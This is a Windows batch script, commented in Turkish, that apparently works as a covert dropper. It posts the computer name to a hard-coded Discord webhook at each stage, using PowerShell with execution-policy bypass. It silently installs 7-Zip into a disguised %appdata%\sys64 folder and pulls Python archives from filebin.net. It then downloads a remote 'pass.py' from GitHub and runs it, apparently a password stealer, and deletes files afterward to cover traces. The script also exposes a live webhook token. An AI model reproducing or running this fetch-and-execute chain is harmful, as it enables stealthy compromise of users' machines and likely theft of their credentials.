@echo off

:: Set the webhook URL and message
set "webhookUrl=https://discord.com/api/webhooks/1240038860205985894/qhYcRwGnxahYevjx_X-QSDQXwSj6kOSO4L_47tbHJw8sT4xo29YcWOwZuAiZnqP7XhIz"
set "startMessage=CMD has been opened on %COMPUTERNAME% at %date% %time%."
set "downloadStartMessage=Python download started on %COMPUTERNAME% at %date% %time%."
set "downloadEndMessage=Python download finished on %COMPUTERNAME% at %date% %time%."

:: Function to send a webhook notification
:send_webhook
(
echo param ^(^[string^]$webhookUrl, ^[string^]$message^)
echo $body = ^@^{
echo content = $message
echo ^} ^| ConvertTo-Json
echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body
) > SendWebhook.ps1

:: Send start notification
powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%startMessage%"

:: Delete the temporary PowerShell script
del SendWebhook.ps1

:: Continue with the rest of the script

:: %appdata% yolunda sys64\7zip klasörü oluştur
set "baseFolderPath=%appdata%\sys64"
set "installFolderPath=%baseFolderPath%\7zip"

if not exist "%installFolderPath%" (
    mkdir "%installFolderPath%"
)

:: 7zip dosyasını indir
set "downloadUrl=https://www.7-zip.org/a/7z2406-x64.exe"
set "downloadPath=%baseFolderPath%\7z2406-x64.exe"

bitsadmin /transfer myDownloadJob /download /priority high "%downloadUrl%" "%downloadPath%"

:: İndirilen 7zip dosyasını 7zip klasörüne kur
cd /d "%baseFolderPath%"
"%downloadPath%" /D=%installFolderPath% /S

:: Kurulum dosyasını kalıcı olarak sil
del "%downloadPath%" /f /q
:: Silinen dosyanın geri dönüşüm kutusuna gitmemesi için ek önlem
echo Y|cacls "%downloadPath%" /P everyone:n

:: Notify before Python download starts
echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
echo $body = ^@^{ >> SendWebhook.ps1
echo content = $message >> SendWebhook.ps1
echo ^} ^| ConvertTo-Json >> SendWebhook.ps1
echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body >> SendWebhook.ps1

powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%downloadStartMessage%"

del SendWebhook.ps1

:: Dosyaları sys64 klasörüne indir
set "pythonZipUrl=https://filebin.net/9bar1vgdcaklyoxf/Python312.zip"
set "pythonPartUrl=https://filebin.net/5w7mkubbzhzmy2q0/Python312.z01"
set "pythonZipPath=%baseFolderPath%\Python312.zip"
set "pythonPartPath=%baseFolderPath%\Python312.z01"

bitsadmin /transfer pythonZipDownload /download /priority high "%pythonZipUrl%" "%pythonZipPath%"
bitsadmin /transfer pythonPartDownload /download /priority high "%pythonPartUrl%" "%pythonPartPath%"

:: Notify after Python download finishes
echo param ^(^[string^]$webhookUrl, ^[string^]$message^) > SendWebhook.ps1
echo $body = ^@^{ >> SendWebhook.ps1
echo content = $message >> SendWebhook.ps1
echo ^} ^| ConvertTo-Json >> SendWebhook.ps1
echo Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body >> SendWebhook.ps1

powershell -ExecutionPolicy Bypass -File SendWebhook.ps1 -webhookUrl "%webhookUrl%" -message "%downloadEndMessage%"

del SendWebhook.ps1

:: py klasörünü oluştur
set "extractFolderPath=%baseFolderPath%\py"
if not exist "%extractFolderPath%" (
    mkdir "%extractFolderPath%"
)

:: 7z.exe kullanarak python312.zip'i çıkart
cd /d "%baseFolderPath%\7zip"
"%installFolderPath%\7z.exe" x "%pythonZipPath%" -o"%extractFolderPath%"

:: Python312.zip ve Python312.z01 dosyalarını kalıcı olarak sil
del "%pythonZipPath%" /f /q
del "%pythonPartPath%" /f /q

:: Silinen dosyaların geri dönüşüm kutusuna gitmemesi için ek önlem
echo Y|cacls "%pythonZipPath%" /P everyone:n
echo Y|cacls "%pythonPartPath%" /P everyone:n

:: scripts klasörünü oluştur ve pass.py dosyasını indir
set "scriptsFolderPath=%baseFolderPath%\scripts"
if not exist "%scriptsFolderPath%" (
    mkdir "%scriptsFolderPath%"
)

set "scriptUrl=https://github.com/nizhenets/test/raw/main/pass.py"
set "scriptPath=%scriptsFolderPath%\pass.py"

bitsadmin /transfer scriptDownload /download /priority high "%scriptUrl%" "%scriptPath%"

:: Yolları kontrol et
echo Python path: "%extractFolderPath%\pythonw.exe"
echo Script path: "%scriptPath%"

:: pass.py scriptini çalıştır
"%extractFolderPath%\python.exe" "%scriptPath%"

:: Hata ayıklama için python.exe kullan
:: "%extractFolderPath%\python.exe" "%scriptPath%"

:: py klasörünü ve içeriğini sil
rmdir /s /q "%extractFolderPath%"

echo İşlem tamamlandı.